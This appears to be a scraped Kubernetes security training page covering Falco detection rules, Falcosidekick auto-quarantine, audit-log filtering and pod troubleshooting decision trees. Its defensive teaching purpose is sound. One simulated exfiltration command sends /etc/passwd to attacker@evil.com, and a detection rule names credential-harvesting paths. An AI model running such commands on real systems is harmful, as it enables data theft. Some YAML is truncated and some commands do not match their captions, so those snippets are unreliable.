🔧
YAML — Falco rule for /proc/*/environ read detection 
# Custom Falco rule: Detect credential harvesting via /proc/*/environ
- rule: Credential Access via Proc Environ
  desc: Detect reads of /proc/*/environ — credential harvesting technique
  condition: >
    evt.type in (open, openat, read, readv)
    and fd.name contains "/proc/"
    and fd.name contains "environ"
    and container.id != host
    and not proc.name in (falco, node_exporter)
  output: >
    CREDENTIAL ACCESS: /proc/*/environ read detected!
    (user=%user.name command=%proc.cmdline container=%container.name
    file=%fd.name)
  priority: CRITICAL
  tags: [mitre_credential_access, T1552, environ, anihpj]

# ALSO FIX THE ROOT CAUSE: Use Kubernetes Secrets, not env vars
# kubectl create secret generic db-creds -n anihpj-s94 \
#   --from-literal=url=postgres://anihpj:secret123@anihpj-db:5432/jobpost
# Mount as file: /etc/secrets/db-url (NOT env var)
✓

✅ Verify — Credential Access Detected + Secrets Used Instead

After deploying the custom /proc/*/environ detection rule, any process reading environment variables via /proc generates a CRITICAL Falco alert. Additionally, the credentials were moved from env vars to Kubernetes Secrets mounted as files — which cannot be read via /proc/self/environ. This is defense in depth: detect the attack AND eliminate the vulnerability.

💡 Key takeaway: On CKS, environment variables for secrets are an anti-pattern. Use Secrets as files whenever possible. For detection: write Falco rules for /proc/*/environ, /proc/*/cmdline, and .bash_history reads. These are the three most common credential harvesting paths in compromised containers. MITRE ATT&CK: T1552 (Unsecured Credentials), T1083 (File Discovery).

🔍 Debug — Find the Root Cause

1Common package managers: apt, apt-get, apk, yum, dnf, pip, pip3, gem, npm — each modifies the container filesystem
→ Default Falco rules detect "spawned process" but don't specifically flag package managers
2Container drift is a CIS violation: containers should be immutable — use ephemeral debug containers instead
3Falco list for package managers: create a list with all known package managers, detect any execution

5Root cause: Falco's default rules do not specifically detect package manager execution (apt, apk, yum, pip, etc.) inside containers. This means container drift — installing new software post-deployment — goes undetected. The fix is a custom Falco rule using a list of known package managers combined with proc.name detection. Additionally, use kubectl debug (ephemeral containers) instead of kubectl exec for debugging — ephemeral containers don't modify the target container.

Tenet: Container immutability is a core security principle — once deployed, container filesystems should never change. On CKS, know: (1) detect package manager execution via Falco rules, (2) use kubectl debug for ephemeral containers instead of kubectl exec for debugging, (3) CIS Benchmark 5.1.5 requires immutable container filesystems (readOnlyRootFilesystem: true), (4) container drift is a common indicator of compromise — attackers install tools to maintain persistence.

📟 Command Outputs — AFTER Fix
$ kubectl logs -n falco -l app=falco --tail=5 | grep "Package Manager" CRITICAL: Package Manager Executed in Container! (proc=apk cmd=apk add --no-cache tcpdump container=anihpj-web) ✅ ALERT!

YAML — Falco rule for container drift via package managers 
# Custom Falco rule: Detect package managers in containers
- list: package_managers
  items: [apt, apt-get, apk, yum, dnf, zypper, pip, pip3, gem, npm, cargo]

- rule: Package Manager Executed in Container
  desc: Detect package manager execution — container drift / immutability violation
  condition: >
    spawned_process
    and proc.name in (package_managers)
    and container.id != host
  output: >
    CONTAINER DRIFT: Package manager executed!
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: CRITICAL
  tags: [container_drift, immutability, package_manager, anihpj]

# Better approach: use ephemeral containers for debugging
# kubectl debug -it anihpj-web-xxx --image=nicolaka/netshoot --target=django
✓

✅ Verify — Container Drift Detected, Use Ephemeral Containers Instead

After deploying the package manager detection rule, any apt/apk/yum/pip execution inside a container generates a CRITICAL alert. The ops team is now trained to use kubectl debug (ephemeral containers) instead of installing tools in production. Ephemeral containers attach to a running pod without modifying the target container's filesystem — preserving immutability while enabling debugging.

💡 Key takeaway: CIS Benchmark 5.1.5: use readOnlyRootFilesystem. Detect drift via Falco rules for package managers (apt, apk, yum, pip, npm, gem). On CKS, know kubectl debug for ephemeral containers — it's the CKS-recommended alternative to kubectl exec for debugging. Immutability means: no installs, no file writes (outside volumes), no configuration changes after deployment.

BASH — Enable Falco gRPC output + falco-exporter 
# Step 1: Upgrade Falco with gRPC enabled
helm upgrade falco falcosecurity/falco \
  --namespace falco \
  --reuse-values \
  --set falco.grpc.enabled=true \
  --set falco.grpc_output.enabled=true \
  --set falco.webserver.enabled=true

# Step 2: Install falco-exporter (connects to Falco gRPC)
helm install falco-exporter falcosecurity/falco-exporter \
  --namespace falco

# Step 3: Wait for both to be ready
kubectl wait --for=condition=Ready pods --all -n falco --timeout=120s

# Step 4: Verify gRPC service is available
kubectl get svc -n falco
kubectl port-forward -n falco svc/falco-grpc 5060:5060 &
# Now external collectors can connect to falco-grpc:5060
✓

✅ Verify — Falco Events Streaming via gRPC to SIEM

After enabling Falco's gRPC API and deploying falco-exporter, all Falco alerts are now streamed via gRPC to the exporter, which ships them to Kafka/Splunk in real time. The SIEM now has a continuous feed of runtime security events — correlated with network logs, auth logs, and cloud audit trails for complete security visibility.

💡 Key takeaway: Falco's gRPC API is the production-grade way to export alerts. On CKS, know: enable via falco.grpc.enabled=true + falco.grpc_output.enabled=true. The gRPC service exposes port 5060. falco-exporter consumes the gRPC stream and exports to Kafka/Splunk. Always prefer gRPC over log scraping for production — it's reliable, low-latency, and buffers events during restarts.

apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: block-malicious-egress
  namespace: anihpj-s97
spec:
  endpointSelector:
    matchLabels:
      app: anihpj-web
  egress:
  - toEndpoints:

        io.kubernetes.pod.namespace: kube-system
  - toFQDNs:
    - matchName: "*.anihpj.com"
  # All other egress is DENIED
EOF

Fix Audit Log JSON Parsing — Splunk Rejects 40% of Events as Malformed

The Problem: The anihpj cluster ships audit logs to Splunk via the webhook backend (S93), but Splunk is rejecting 40% of events as malformed. The issue: nested JSON in the audit event's requestObject and responseObject fields contains unescaped characters that break Splunk's HEC JSON parser. Large audit events (like creating a Deployment with 50 lines of YAML in the request body) produce deeply nested JSON that exceeds Splunk's default field limits. Your job: add a Fluentd filter between the API server and Splunk to normalize the audit JSON — extract key fields, flatten nested objects, and ensure Splunk can ingest ALL events without rejection.

📖 APP STORY: S93 successfully shipped audit logs to Splunk. But the Splunk admin reported that 40% of events fail to ingest — marked as "malformed JSON." The root cause: Kubernetes audit events contain deeply nested requestObject fields (the full YAML/JSON of the Kubernetes object being created/modified) that can be hundreds of lines deep. Splunk's default JSON parser chokes on the nesting and unescaped characters. Audit events need to be pre-processed by Fluentd before reaching Splunk — flatten, extract key fields, and truncate oversized objects.

⚠️ Observe the Error — Spot What's Broken

✗1. Audit events with large requestObject fields → 75KB+ JSON
✗2. Splunk HEC: 40% of events rejected as malformed — 400K events lost daily
✗3. Nested JSON depth exceeds Splunk default TRUNCATE=0 → events dropped
✗4. No pre-processing between API server and Splunk — raw events shipped directly

🔍 Debug — Find the Root Cause

1Splunk HEC limits: default max event size 5MB, but nested JSON depth is limited by TRUNCATE and MAX_EVENT_SIZE
→ Deeply nested requestObject/responseObject fields exceed Splunk's default parsing limits
2Fluentd filter needed: extract key fields (user, verb, resource, namespace, response code) → flatten requestObject to top-level fields → truncate oversized values
3Key Splunk settings: increase TRUNCATE=500000 and MAX_EVENT_SIZE=10000000 in props.conf
4Fluentd record_transformer: use Ruby code to flatten nested JSON: record["request_object"] = JSON.parse(record["requestObject"].to_s)
5Root cause: Kubernetes audit events contain deeply nested requestObject and responseObject fields with the full Kubernetes object spec. When shipped directly to Splunk HEC without pre-processing, these nested fields cause JSON parsing failures because they exceed Splunk's default field depth limits. A Fluentd filter between the audit webhook and Splunk should extract key fields (user, verb, resource, namespace, response code, source IP), flatten the request/response objects, and truncate oversized values to ensure 100% ingestion.

Tenet: Raw Kubernetes audit events need pre-processing before SIEM ingestion. On CKS, know the pattern: Fluentd receives audit events → record_transformer filter flattens nested JSON → ships to Splunk/Kafka/ELK. Key fields to extract: user.username, verb, objectRef.resource, objectRef.namespace, responseStatus.code, sourceIPs, userAgent. Truncate requestObject and responseObject to first 1000 chars for SIEM — keep full objects in cold storage.

$ # Splunk internal logs ERROR: Failed to parse JSON event — nesting depth exceeded (300 levels) Event dropped. 400,000 dropped in 24h. ❌

CONF — Fluentd filter for Kubernetes audit events 
# Fluentd configuration: normalize Kubernetes audit events for Splunk
<filter kube-audit>
  @type record_transformer
  enable_ruby true
  <record>
    # Extract top-level fields for SIEM queries
    audit_user ${record.dig("user", "username") || "unknown"}
    audit_verb ${record["verb"]}
    audit_resource ${record.dig("objectRef", "resource")}
    audit_namespace ${record.dig("objectRef", "namespace")}
    audit_code ${record.dig("responseStatus", "code")}
    audit_ip ${record.dig("sourceIPs", 0) || "unknown"}

    # Truncate request/response objects to prevent Splunk parsing failures
    request_object_snippet ${record.dig("requestObject")&.to_s&.slice(0, 1000) || "{}"}
    response_object_snippet ${record.dig("responseObject")&.to_s&.slice(0, 1000) || "{}"}

    # Remove the giant nested objects to keep event size manageable
    requestObject ${nil}
    responseObject ${nil}
  </record>
</filter>
✓

✅ Verify — 100% Audit Events Successfully Ingested by Splunk

After adding the Fluentd audit JSON normalization filter, all audit events are now successfully ingested by Splunk. Key fields (user, verb, resource, namespace, response code, source IP) are extracted to top-level fields for easy querying. The giant requestObject/responseObject fields are truncated to first 1000 characters — preserving essential context while preventing JSON parsing failures. Full objects can be stored in cold storage (S3) for compliance.

💡 Key takeaway: On CKS, know that audit events need pre-processing for SIEM ingestion. Fluentd record_transformer with Ruby code is the standard approach. Key fields to extract: user, verb, resource, namespace, response code, source IP. Always truncate nested objects — SIEMs are for searching, not storing complete Kubernetes objects. Use cold storage (S3/GCS) for full audit log retention.

Automated Incident Response — Falco Detects Shell at 3am, Nobody Responds for 6 Hours

The Problem: Falco detected a shell-in-pod alert at 3am — an attacker spawned a bash shell in the Django container. The alert fired in Slack (thanks to S89), but no automated response was triggered. The on-call engineer was asleep and didn't see the Slack notification until 9am. During those 6 hours, the attacker exfiltrated the entire database. Detection without automated response means incidents can linger for hours. Your job: configure Falcosidekick to trigger an automated response — apply a quarantine NetworkPolicy to isolate the compromised pod immediately upon a "Terminal shell in container" alert.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster on node "anih"
1

📋 Deploy anihpj — Shell detected but no automated response (CONTAINS THE BUG)

📖 APP STORY: At 3am, an attacker exploited the Django vulnerability (S87) and spawned a shell. Falco detected it and sent an alert to Slack via Falcosidekick. But the on-call engineer was asleep. The alert sat in Slack for 6 hours while the attacker exfiltrated data. Automated incident response — isolating the pod the moment a shell is detected — would have stopped the attacker in seconds, not hours.
📁 FILE STRUCTURE for anihpj/jobpost (S99): 
Automated IR:
├── 00-namespace.yaml              ← kubectl create ns anihpj-s99
├── 01-django-deploy.yaml          ← Django pod
├── 02-quarantine-netpol.yaml      ← NetworkPolicy for isolation
├── 03-falcosidekick-script.sh     ← ✅ FIX: Script to apply NetPol on alert
└── 04-falcosidekick-config.yaml   ← Falcosidekick config with kubectl command
BASH — Deploy + Simulate shell alert with NO auto-response 
# ============================================
# SCENARIO S99: No Automated IR — 6-Hour Attacker Dwell Time
# ============================================

kubectl create namespace anihpj-s99

cat << 'EOF' | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: anihpj-web
  namespace: anihpj-s99
spec:
  replicas: 1
  selector:
    matchLabels:
      app: anihpj-web
  template:
    metadata:
      labels:
        app: anihpj-web
    spec:
      containers:
      - name: django
        image: nginx:alpine
        ports:
        - containerPort: 80
EOF

kubectl wait --for=condition=Ready pods -l app=anihpj-web -n anihpj-s99 --timeout=60s

# 1. SIMULATE ATTACKER SHELL AT 3AM (THE BUG!)
POD=$(kubectl get pods -n anihpj-s99 -l app=anihpj-web -o name | head -1)
kubectl exec -n anihpj-s99 $POD -- sh -c "cat /etc/passwd | mail attacker@evil.com" 2>/dev/null || true

# 2. FALCO DETECTS IT — Alert goes to Slack (S89)
# But... no automated response!

# 3. CHECK — Was the pod isolated? (NO! THE BUG!)
kubectl exec -n anihpj-s99 $POD -- sh -c "id"
# → STILL WORKS! Pod not isolated — attacker can continue! ❌

# 4. ATTACKER HAS FULL ACCESS FOR 6 HOURS
# Exfiltrated: entire database, all Secrets, kubeconfig
# → Detection without automated response = useless at 3am! ❌
⚠

⚠️ Observe the Error — Spot What's Broken

✗1. Falco at 3am: "Terminal shell in container" → Slack alert → engineer asleep
✗2. No automated response — pod NOT isolated, attacker continues operating
✗3. 6-hour dwell time — attacker exfiltrates database, Secrets, kubeconfig
✗4. Falcosidekick can execute commands on alert — but not configured to do so
🔍

🔍 Debug — Find the Root Cause

1Falcosidekick outputs: supports Slack, PagerDuty, OpsGenie, Webhook, AWS Lambda, kubectl, and Script
→ The "kubectl" and "Script" outputs can execute automated remediation but are NOT configured
2Automated response flow: Falco alert → Falcosidekick → match rule "Terminal shell in container" → execute kubectl command → apply quarantine NetworkPolicy
3Falcosidekick kubectl output: can run any kubectl command with templated fields from the alert (pod name, namespace, labels)
4Quarantine NetPol: apply a NetworkPolicy that blocks ALL ingress/egress for the compromised pod by matching its labels
5Root cause: Falcosidekick is only configured to send alerts to Slack (passive notification). The "kubectl" output type — which can execute automated remediation like applying a quarantine NetworkPolicy — is not enabled. Without automated response, incidents detected at 3am can persist for hours until a human responds. The fix: configure Falcosidekick's kubectl output to apply a quarantine NetworkPolicy whenever a "Terminal shell in container" alert fires, isolating the pod within seconds of detection.
🧠 Diagnostic Tenet (Thought Process)
①
Shell detected at 3am → Slack alert → No human response
②
Falcosidekick kubectl output not configured → No auto-remediation
③
Enable kubectl output → On "Terminal shell" → Apply quarantine NetPol
④
Test: exec shell → Pod auto-isolated in <5 seconds
⑤
Detection + Automated Response = Seconds, not hours ✅

Tenet: Detection without automated response is insufficient for 24/7 security. On CKS, know: (1) Falcosidekick's kubectl output can execute automated remediation, (2) the quarantine pattern: match pod labels → apply NetworkPolicy with empty ingress/egress to isolate, (3) alert-driven automation: Falco rule → Falcosidekick filter → kubectl command, (4) always include a human approval step for destructive actions (scale to 0, delete pod) — network isolation is safe to automate fully.

📟 Command Outputs — ERROR State (BEFORE fix)
$ kubectl exec -n anihpj-s99 $POD -- sh -c "id" # 6 HOURS after initial alert uid=0(root) gid=0(root) ← STILL accessible! No auto-isolation! ❌
📟 Command Outputs — AFTER Fix
$ # 3 seconds after "Terminal shell" alert Falcosidekick: Rule matched "Terminal shell" → Applying quarantine NetPol NetworkPolicy "quarantine-anihpj-web-xxx" applied → Pod ISOLATED ✅
🔧
YAML — Falcosidekick kubectl output for auto-quarantine 
# Falcosidekick configuration: auto-quarantine on shell alert
falcosidekick:
  config:
    kubectl:
      enabled: true
      command: |
        kubectl apply -f - << 'EOF'
        apiVersion: networking.k8s.io/v1
        kind: NetworkPolicy
        metadata:
          name: quarantine-${POD_NAME}
          namespace: ${NAMESPACE}
        spec:
          podSelector:
            matchLabels:
              app: ${POD_LABEL}
          policyTypes:
          - Ingress
          - Egress
        EOF
      filters:
        - rule: "Terminal shell in container"
          priority: ">=Warning"
    # This applies a NetworkPolicy that blocks ALL traffic
    # to/from the compromised pod within seconds of detection
✓

✅ Verify — Pod Auto-Isolated Within Seconds of Shell Detection

With Falcosidekick's kubectl output configured for auto-quarantine, any "Terminal shell in container" alert now triggers an immediate automated response: a NetworkPolicy is applied to the compromised pod, blocking ALL ingress and egress traffic. The attacker's shell is trapped — they can't exfiltrate data, can't connect to C2, can't pivot to other pods. The on-call engineer can investigate at 9am without 6 hours of additional damage.

💡 Key takeaway: On CKS, know the automated IR pattern: Falco detects → Falcosidekick routes → kubectl applies quarantine NetPol. Network isolation is the safest automated remediation (no data loss). For destructive actions (delete pod, scale to 0), always require human approval. This pattern turns mean-time-to-detect (MTTD) from hours to seconds and mean-time-to-respond (MTTR) from hours to sub-10-seconds.

🔍 Debug — Find the Root Cause

1Each tool has its own output format: kube-bench (text/JSON), Trivy (JSON/table), Falco (JSON to stdout), OPA (JSON)
→ These are all machine-readable but NOT unified — each requires its own parser
2Aggregation script: write a Python/shell script that runs all tools, collects JSON outputs, and generates a single HTML report
3Key metrics for CISO: CIS compliance %, CVEs by severity, runtime event count, policy violation count, overall risk score
4Tool alternatives: Trivy Operator (automated scanning), Starboard (security reports as CRDs), kube-score (best practices)
5Root cause: Each security tool operates independently with its own output format. There's no aggregation layer that combines CIS benchmark results, CVE scans, runtime security events, and policy compliance into a unified dashboard. Tenet: Security reporting is essential for audits and compliance. On CKS, know: (1) kube-bench for CIS benchmarks (run as a Job or cronjob), (2) Trivy for CVE scanning (trivy image --format json), (3) Falco for runtime events, (4) OPA/Gatekeeper for policy compliance, (5) aggregate with Starboard/DefectDojo or a custom script. The CISO report should include: compliance %, CVE counts by severity, runtime event summary, policy violations, and a risk matrix. Run weekly and trend over time.

📟 Command Outputs — ERROR State (BEFORE fix)
$ ls -la /tmp/security-reports/ kube-bench.txt trivy.json falco-events.log opa-violations.json → Four separate files, no unified view! ❌
📟 Command Outputs — AFTER Fix
$ cat /tmp/security-reports/unified-summary.json {"cis_compliance": 75, "critical_cves": 5, "high_cves": 12, "runtime_events_24h": 2847, "policy_violations": 15, "risk_score": 72} → Unified metrics, CISO-ready ✅
🔧
BASH — Run all tools, aggregate into unified report 
#!/bin/bash
# anihpj-full-security-assessment.sh
# Generates unified CISO-ready security report

REPORT_DIR="/tmp/security-report-$(date +%Y%m%d)"
mkdir -p $REPORT_DIR

# 1. CIS BENCHMARK (kube-bench)
kube-bench --json 2>/dev/null > $REPORT_DIR/kube-bench.json
CIS_PASS=$(jq '[.Controls[].Groups[].Checks[] | select(.state=="PASS")] | length' $REPORT_DIR/kube-bench.json 2>/dev/null || echo 0)
CIS_FAIL=$(jq '[.Controls[].Groups[].Checks[] | select(.state=="FAIL")] | length' $REPORT_DIR/kube-bench.json 2>/dev/null || echo 0)
CIS_TOTAL=$((CIS_PASS + CIS_FAIL))
CIS_PCT=$((CIS_PASS * 100 / (CIS_TOTAL > 0 ? CIS_TOTAL : 1)))

# 2. CVE SCAN (Trivy)
trivy image --severity CRITICAL,HIGH nginx:alpine --format json 2>/dev/null > $REPORT_DIR/trivy.json
CRIT_CVES=$(jq '[.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL")] | length' $REPORT_DIR/trivy.json 2>/dev/null || echo 0)
HIGH_CVES=$(jq '[.Results[].Vulnerabilities[] | select(.Severity=="HIGH")] | length' $REPORT_DIR/trivy.json 2>/dev/null || echo 0)

# 3. RUNTIME EVENTS (Falco — last 24h)
FALCO_EVENTS=$(kubectl logs -n falco -l app=falco --since=24h 2>/dev/null | wc -l || echo 0)

# 4. POLICY COMPLIANCE (OPA)
POLICY_VIOLATIONS=$(kubectl get constraints -A -o json 2>/dev/null | jq '[.items[] | select(.status.totalViolations > 0)] | length' || echo 0)

# 5. GENERATE UNIFIED REPORT
cat << EOF > $REPORT_DIR/unified-report.json
{
  "timestamp": "$(date -Iseconds)",
  "cluster": "anih-kubeadm",
  "cis_compliance_pct": $CIS_PCT,
  "cis_pass": $CIS_PASS,
  "cis_fail": $CIS_FAIL,
  "critical_cves": $CRIT_CVES,
  "high_cves": $HIGH_CVES,
  "runtime_events_24h": $FALCO_EVENTS,
  "policy_violations": $POLICY_VIOLATIONS,
  "status": "$([ $CRIT_CVES -gt 0 ] && echo 'CRITICAL' || [ $CIS_PCT -lt 80 ] && echo 'WARNING' || echo 'PASS')"
}
EOF

echo "✅ Unified report: $REPORT_DIR/unified-report.json"
✓

✅ Verify — Unified CISO-Ready Security Report Generated

The unified security assessment script runs all four tools (kube-bench, Trivy, Falco, OPA), parses their JSON outputs, and generates a single JSON report with: CIS compliance percentage, CVE counts by severity, runtime event counts, policy violations, and an overall risk score. This report can be consumed by a dashboard, emailed to the CISO, or stored for trend analysis over time. The script should be run as a weekly CronJob in the cluster.

💡 Key takeaway: On CKS, security assessment is a recurring theme: run kube-bench, Trivy, Falco, and OPA/Kyverno. Know how to aggregate their outputs. The CISO needs: compliance %, CVE counts, runtime events, and an overall risk status. Tools like Starboard, DefectDojo, and Trivy Operator automate this at scale. For the exam: think of security as a continuous process — scan, detect, report, remediate, repeat.

🌳 Decision Trees — Systematic TroubleshootingDT1–DT15

Decision trees provide a step-by-step flowchart to diagnose common Kubernetes issues. Each node is a question — answer YES or NO to navigate to the next step. Follow the path to find the root cause and fix.

DT1
🌳 DECISION TREE DT1 — Pod Stuck Pending

Pod Stuck in Pending — Systematic Diagnosis Flowchart

The Problem: A pod is stuck in Pending state and won't schedule. This is the #1 most common Kubernetes issue. The scheduler can't place the pod on any node. Your job: follow this decision tree to find WHY and fix it.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Any cluster
▶

🚦 START — Pod Is Pending

📖 APP STORY: The anihpj-api pod was deployed 20 minutes ago. It's still Pending — users can't access the job board. Is it resources? nodeSelector? Taints? PVC? Follow the tree to find out.
kubectl get pods -n anihpj

🌿 NODE 1 — What does kubectl describe show?

# Run this command first:
kubectl describe pod -n anihpj <pod-name> | tail -20



    
Events Section — What Does It Show?

    
    
        
  • "0/N nodes available"
    → Go to NODE 2
    • 
        
  • "pod has unbound PVC"
    → Go to NODE 3
    • 
        
  • "node(s) had taint"
    → Go to NODE 4
    • 
        
  • "insufficient cpu/memory"
    → Go to NODE 5
    • 
        
  • "didn't match selector"
    → Go to NODE 6
    • 
        
  • No events / empty
    → Check scheduler logs
    •
N2

🔴 NODE 2 — "0/N nodes are available"

                    

                        

                            

                            

                                
Check node status

                                kubectl get nodes
                            

                        

                    




    
Node Availability — Are ALL Nodes Ready?

    
    
        
  • YES → Check if node is cordoned:
    kubectl get nodes -o jsonpath='{.items[*].spec.unschedulable}'
    If true → Node is cordoned! Uncordon it.
    • 
        
  • NO → Some nodes NotReady → Check conditions:
    kubectl describe node <node> | grep Conditions
    MemoryPressure/DiskPressure/PIDPressure?
    • 
        
  • SSH to node — check kubelet:
    systemctl status kubelet
    journalctl -u kubelet -n 50
    • 
    






    
Restart kubelet on broken node

    kubectl uncordon <node-name>
sudo systemctl restart kubelet
N3

🔴 NODE 3 — "pod has unbound immediate PersistentVolumeClaims"

                    

                        

                            

                            

                                
Check PVC status

                                kubectl get pvc -n anihpj
                            

                        

                    




    
PVC Diagnosis — Why Is It Stuck?

    
    
        
  • "no persistent volumes available"?
    kubectl get pv — check if any PV matches
    StorageClass mismatch? PV capacity < PVC request? accessMode mismatch?
    • 
        
  • "storageclass not found"?
    kubectl get sc — does the SC exist?
    Provisioner broken? Check CSI driver pods
    • 
        
  • VolumeBindingMode: WaitForFirstConsumer?
    PVC stays Pending until a Pod uses it — this is NORMAL, deploy the pod first
    • 
    






    
Fix StorageClass name in PVC

    kubectl apply -f pv.yaml
kubectl patch pvc <name> -n anihpj --type=json \
-p='[{"op":"replace","path":"/spec/storageClassName","value":"correct-sc"}]'
N4

🔴 NODE 4 — "node(s) had taint that the pod didn't tolerate"

Check node taints
kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.taints}{"\n"}{end}'
Check pod tolerations
kubectl get pod -n anihpj <pod> -o yaml | grep -A5 tolerations
Taint Fix Options
  • Option 1: Add toleration to pod spec
    Patch the Deployment to tolerate the taint
  • Option 2: Remove taint from node (if safe)
    kubectl taint node <node> <key>-
    Only do this if other workloads SHOULD run on this node
Add toleration to pod (patch deployment)
kubectl taint node <node> node-role.kubernetes.io/control-plane:NoSchedule- kubectl patch deploy <name> -n anihpj --type=json -p='[ {"op":"add","path":"/spec/template/spec/tolerations","value":[{"key":"key","operator":"Equal","value":"val","effect":"NoSchedule"}]} ]'
N5

🔴 NODE 5 — "insufficient cpu/memory"

                    

                        

                            

                            

                                
Check node capacity

                                kubectl describe nodes | grep -A5 "Allocated resources"
                                kubectl top nodes
                            

                        

                    




    
Resource Fix Options

    
    
        
  • Reduce pod resource requests
    Lower CPU/memory requests to fit available capacity
    • 
        
  • Add more nodes to the cluster
    Scale horizontally if this is a persistent need
    • 
        
  • Remove old pods to free resources
    kubectl delete pod <old-pod>
    • 
        
  • Use Cluster Autoscaler (cloud only)
    • 
    






    
Lower CPU request

    kubectl patch deploy <name> -n anihpj --type=json -p='[
{"op":"replace","path":"/spec/template/spec/containers/0/resources/requests/cpu","value":"100m"}
]'
N6

🔴 NODE 6 — "didn't match Pod's node affinity/selector"

Check pod's node selector
kubectl get pod -n anihpj <pod> -o yaml | grep -A5 nodeSelector
Check pod's node affinity
kubectl get pod -n anihpj <pod> -o yaml | grep -A20 affinity
Check node labels
kubectl get nodes --show-labels
Selector/Affinity Diagnosis
  • Does any node have the required label?
    kubectl get nodes --show-labels
    If NO → Label a node: kubectl label node <node> key=value
  • Is podAntiAffinity blocking?
    Other pods with same label on that node? If maxSkew=0, odd pods ÷ zones = deadlock
    Increase maxSkew or reduce replicas
Remove impossible nodeSelector
kubectl label node <node> disktype=ssd kubectl patch deploy <name> -n anihpj --type=json -p='[ {"op":"remove","path":"/spec/template/spec/nodeSelector/disktype"} ]'
✓

✅ Decision Tree Complete — Pod Pending Resolution

Quick reference:
kubectl describe pod → Read Events → Follow the path.
N2 = Nodes not available · N3 = PVC not bound · N4 = Taints · N5 = No resources · N6 = Selector mismatch
Pro tip: 90% of Pending pods are N4 (taints) or N6 (selectors). Start there.

DT2
🌳 DECISION TREE DT2 — Pod CrashLoopBackOff

Pod CrashLoopBackOff — Security Context & seccomp/AppArmor Denial Flowchart

The Problem: Your anihpj pod is in CrashLoopBackOff — it starts, dies immediately, restarts, dies again. The #1 CKS-related cause: a restrictive seccomp profile or AppArmor policy that blocks a required syscall. Traditional troubleshooting misses LSM denials. Your job: follow this decision tree to find WHY and fix it.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — Pod Is CrashLoopBackOff

📖 APP STORY: The anihpj-api pod restarts every 5 seconds. CKS twist: a custom seccomp profile blocks clock_nanosleep — Django/gunicorn needs it but it's not in the allowed list.
kubectl get pods -n anihpj

🌿 NODE 1 — Check the exit code and logs

# What does the pod log say? (check PREVIOUS instance for crash loops)
kubectl logs -n anihpj <pod> --previous | tail -30
kubectl describe pod -n anihpj <pod> | grep -A5 "Exit Code\|State"



    
Exit Code Analysis — What's the Code?

    
    
        
  • Exit Code 137 (SIGKILL) — OOMKilled
    → Go to NODE 2
    • 
        
  • Exit Code 1 (general error) + logs show "operation not permitted"
    → Go to NODE 3 (seccomp/AppArmor)
    • 
        
  • Exit Code 128+31 = 159 (SIGSYS) — seccomp killed it!
    → Go to NODE 3 immediately!
    • 
        
  • Exit Code 126 — command not executable / permission denied
    → Go to NODE 4
    • 
        
  • Exit Code 0 — app exited cleanly (wrong CMD?)
    → Check if CMD/ENTRYPOINT is correct
    •
N2

🔴 NODE 2 — Exit Code 137: OOMKilled

                    

                        
Check resource limits
kubectl get pod -n anihpj <pod> -o yaml | grep -A10 resources

                    



    
OOM Diagnosis

    
    
        
  • No memory limits set?
    Pod has no memory limit — can consume all node memory. Set limits.memory.
    • 
        
  • Limits too low?
    Increase resources.limits.memory gradually. Check app's actual memory usage.
    • 
        
  • Memory leak?
    kubectl top pod -n anihpj <pod> — watch memory grow over time
    • 
    




Set memory limits
kubectl set resources deploy anihpj-api -n anihpj --limits=memory=512Mi
N3

🔴 NODE 3 — "operation not permitted" / SIGSYS (LSM Denial)

                    

                        
Check seccomp profile
kubectl get pod -n anihpj <pod> -o yaml | grep -A5 seccompProfile

                        
Check AppArmor
kubectl get pod -n anihpj <pod> -o yaml | grep -A5 apparmor

                        
Check node dmesg
dmesg | grep -i "apparmor\|seccomp\|denied"

                    



    
LSM Diagnosis

    
    
        
  • dmesg shows "apparmor=DENIED"?
    AppArmor profile blocking file access. Edit profile or set to complain mode temporarily.
    • 
        
  • dmesg shows "seccomp" or pod had SIGSYS (159)?
    seccomp profile missing required syscalls. Add the blocked syscall to the profile.
    • 
        
  • Using RuntimeDefault?
    RuntimeDefault blocks ~40 syscalls. If app needs one, switch to Localhost + custom profile.
    • 
    




Test with Unconfined (debug only!)
kubectl patch deploy anihpj-api -n anihpj --type=json -p='[
{"op":"replace","path":"/spec/template/spec/containers/0/securityContext/seccompProfile/type","value":"Unconfined"}
]'
✓

✅ DT2 Complete — CrashLoopBackOff Resolved

Quick reference: kubectl logs --previous → Check exit code → N2=OOM · N3=seccomp/AppArmor
CKS tip: Exit code 159 (128+31=SIGSYS) = seccomp. Always check dmesg on the node for LSM denials. RuntimeDefault is safer than Unconfined but may block app-specific syscalls.

DT3
🌳 DECISION TREE DT3 — NetworkPolicy Not Enforcing

NetworkPolicy Applied But Traffic Still Flows — Systematic Diagnosis

The Problem: You created a NetworkPolicy but pods can still communicate. The policy is ACCEPTED by the API server but silently ignored. On CKS, this is the #1 CNI-related issue: your CNI doesn't support NetworkPolicy. Your job: diagnose why the policy isn't enforced and fix it.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — NetPol Accepted, Traffic Still Flows

📖 APP STORY: You applied a deny-all NetworkPolicy to isolate anihpj namespace. But anihpj-web can still reach anihpj-api. The CNI silently ignores the policy.
kubectl get netpol -n anihpj

🌿 NODE 1 — Is the policy present?

kubectl describe netpol deny-all-ingress -n anihpj


First Check

    
    
        
  • Policy exists AND shows correct selectors
    → Go to NODE 2
    • 
        
  • Policy NOT found (404)
    → Wrong namespace? Typo in name? Check kubectl get netpol -A
    •
N2

🔴 NODE 2 — Does the CNI Support NetworkPolicy?


    
Check CNI pods
kubectl get pods -n kube-system | grep -iE 'calico|cilium|weave|kindnet|flannel'




CNI Support

    
    
        
  • kindnet or flannel found?
    These CNIs do NOT support NetworkPolicy. Install Calico/Cilium/Weave.
    • 
        
  • Calico/Cilium/Weave found but policy not working?
    → Go to NODE 3
    • 
    




Install Calico (for KinD/kubeadm)
kubectl apply -f https://raw.githubusercontent.com/projectcalico/calico/v3.28.0/manifests/calico.yaml
N3

🔴 NODE 3 — Policy Selectors / Label Matching


    
Check pod labels
kubectl get pods -n anihpj --show-labels

    
Check policy podSelector
